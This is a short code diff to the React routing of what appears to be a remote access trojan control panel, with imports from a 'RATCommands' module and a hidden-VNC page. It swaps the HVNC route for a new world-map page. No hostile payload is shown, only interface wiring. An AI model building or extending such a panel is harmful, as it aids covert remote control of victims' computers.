@@ -19,6 +19,7 @@ import {
   manageHVNC,
 } from "./rat/RATCommands";
 import { HVNC } from "./pages/HVNC";
+import { WorldMap } from "./pages/WorldMap";
 
 export const App: React.FC = () => {
   return (
@@ -107,7 +108,7 @@ export const App: React.FC = () => {
         <Route path="/" element={<Layout />}>
           <Route path="/" element={<Clients />} />
           <Route path="/logs" element={<Logs />} />
-          <Route path="/hvnc/:addr" element={<HVNC />} />
+          <Route path="/worldmap" element={<WorldMap />} />
           <Route path="/settings" element={<Settings />} />
         </Route>
       </Routes>
